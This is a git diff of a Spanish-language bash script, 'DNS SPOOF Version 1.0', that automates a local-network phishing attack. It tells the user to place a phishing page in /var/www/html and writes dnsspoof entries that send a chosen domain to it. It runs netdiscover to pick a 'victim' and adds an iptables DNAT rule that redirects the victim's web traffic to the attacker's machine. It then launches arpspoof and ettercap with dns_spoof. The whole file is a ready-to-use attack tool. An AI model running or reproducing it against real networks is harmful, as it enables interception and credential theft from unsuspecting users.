@@ -1,45 +1,45 @@
 #!/bin/bash
 
 echo " "
-echo "		 ▓█████▄  ███▄    █   ██████   ██████  ██▓███   ▒█████   ▒█████    █████▒	"
-echo "		 ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒ 	"
-echo "		 ░██   █▌▓██  ▀█ ██▒░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░ 	"
-echo "		 ░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░ 	"
-echo "		 ░▒████▓ ▒██░   ▓██░▒██████▒▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░    	"
-echo "		  ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░    	"
-echo "		  ░ ▒  ▒ ░ ░░   ░ ▒░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░      	"
-echo "		  ░ ░  ░    ░   ░ ░ ░  ░  ░  ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░    	"
-echo "		    ░             ░       ░        ░               ░ ░      ░ ░          	"
-echo "		  ░                                                                        	"
-echo "												"
+echo "           ▓█████▄  ███▄    █   ██████   ██████  ██▓███   ▒█████   ▒█████    █████▒       "
+echo "           ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒ ▒██    ▒ ▓██░  ██▒▒██▒  ██▒▒██▒  ██▒▓██   ▒        "
+echo "           ░██   █▌▓██  ▀█ ██▒░ ▓██▄   ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒▒████ ░        "
+echo "           ░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒  ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░░▓█▒  ░        "
+echo "           ░▒████▓ ▒██░   ▓██░▒██████▒▒▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░░▒█░           "
+echo "            ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒ ░           "
+echo "            ░ ▒  ▒ ░ ░░   ░ ▒░░ ░▒  ░ ░░ ░▒  ░ ░░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░  ░             "
+echo "            ░ ░  ░    ░   ░ ░ ░  ░  ░  ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░           "
+echo "              ░             ░       ░        ░               ░ ░      ░ ░                 "
+echo "            ░                                                                             "
+echo "                                                                                          "
 echo " "
-echo "			   		DNS SPOOF Version 1.0		        		"
+echo "                                  DNS SPOOF Version 1.0                                   "
 echo " "
-echo " 				        Created BY Anonimo501					"
-echo "			      	  https://youtube.com/c/Anonimo501	 			"
+echo "                                  Created BY Anonimo501                                   "
+echo "                            https://youtube.com/c/Anonimo501                              "
 echo " "
 echo " "
-echo " "
-read -rsp $'Press enter to continue...\n'
-
-echo " "
-echo " 		**************************************************************************************************"
-echo " 		* Por favor vaya a la ruta /var/www/html/ y cree un index.html con la pagina phishing que desea  *"
-echo " 		**************************************************************************************************"
-echo " "
-echo " 		Este script usara:"
-echo " "
-echo "		Ettercap "
-echo "		Apache2	 "
-echo "		ArpSpoof "
-echo " 		Dnsspoof "
 echo " "
 read -rsp $'Press enter to continue...\n'
 
 echo " "
-echo "		**************************************************************************"
-echo "          	* ingresa dominio de la pagina a clonar (http) Ejemplo: unoraya.com  *"
-echo "          	**************************************************************************"
+echo "          **************************************************************************************************"
+echo "          * Por favor vaya a la ruta /var/www/html/ y cree un index.html con la pagina phishing que desea  *"
+echo "          **************************************************************************************************"
+echo " "
+echo "          Este script usara:"
+echo " "
+echo "          Ettercap "
+echo "          Apache2  "
+echo "          ArpSpoof "
+echo "          Dnsspoof "
+echo " "
+read -rsp $'Press enter to continue...\n'
+
+echo " "
+echo "          **********************************************************************"
+echo "                  * ingresa dominio de la pagina a clonar (http) Ejemplo: unoraya.com  *"
+echo "                  **********************************************************************"
 echo " "
 read dominio
 
@@ -119,8 +119,8 @@ echo "
 #*www.facebook.com A    /var/www/html/index.html
 #*unoraya.com     A     /var/www/html/index.html
 
-*$dominio	A     /var/www/html/index.html
-$dominio	PTR   /var/www/html/index.html
+*$dominio       A     /var/www/html/index.html
+$dominio        PTR   /var/www/html/index.html
 
 ##########################################
 # no one out there can have our domains...
@@ -187,44 +187,60 @@ echo " "
 service apache2 start
 service apache2 restart
 
-echo " 		********************************************************************************"
-echo " 		* Antes de continuar tenga en cuenta que la interface que usara Ejemplo: wlan0 *"
-echo " 		* Debe tener una ip de la red donde hara el ataque (verifique)		      *"
-echo " 		********************************************************************************"
+echo "          ********************************************************************************"
+echo "          * Antes de continuar tenga en cuenta que la interface que usara Ejemplo: wlan0 *"
+echo "          * Debe tener una ip de la red donde hara el ataque (verifique)                 *"
+echo "          ********************************************************************************"
 echo " "
 read -rsp $'Press enter to continue...\n'
 
 echo " "
-echo " 		***********************************************"
-echo " 		* Ingrese la interface de Red. Ejemplo: wlan0 *"
-echo " 		***********************************************"
+echo "          ***********************************************"
+echo "          * Ingrese la interface de Red. Ejemplo: wlan0 *"
+echo "          ***********************************************"
 echo " "
 read interface
 
 echo " "
-echo "	          ****************************"
-echo "	          * Busquemos una victima :) *"
-echo "	          ****************************"
+echo "          ****************************"
+echo "          * Busquemos una victima :) *"
+echo "          ****************************"
 echo " "
 read -rsp $'Press enter to continue...\n'
 
 gnome-terminal -e "netdiscover"
 
 echo " "
-echo " 		**************************************************"
-echo "          	* Ingrese la IP del Router. Ejemplo: 192.168.1.1 *"
-echo " 		**************************************************"
+echo "                  ********************************************************************"
+echo "                  * Una vez sepas que IP Atacar cierra la ventana del escaneo de IPs *"
+echo "                  ********************************************************************"
+echo " "
+read -rsp $'Press enter to continue...\n'
+
+echo " "
+echo "          *******************************************************"
+echo "                  * Ingrese la IP de la Victima. Ejemplo: 192.168.1.100 *"
+echo "          *******************************************************"
+echo " "
+read victima
+
+echo " "
+echo "          *******************************************************"
+echo "                  * Ingrese la IP del Router. Ejemplo: 192.168.1.1      *"
+echo "          *******************************************************"
 echo " "
 read router
 
 echo " "
-echo " 		*******************************************************"
-echo "          	* Ingrese la IP de la victima. Ejemplo: 192.168.1.100 *"
-echo " 		*******************************************************"
+echo "                  ******************************************************************************************"
+echo "                  * Ingrese la TU IP de Atacante. Ejemplo: 192.168.1.70 (Esto para configurar el iptables) *"
+echo "                  ******************************************************************************************"
 echo " "
-read victima
+read ipatacante
 
-gnome-terminal -e "arpspoof -i $interface -t $victima $router"
+iptables -t nat -A PREROUTING -p tcp -s $victima --dport 80 -j DNAT --to-destination $ipatacante:80
+
+gnome-terminal -e "arpspoof -i $interface -t $victima -r $router"
 gnome-terminal -e "ettercap -T -q -i $interface -M arp:remote -P dns_spoof //$router// //$victima//"
 
 
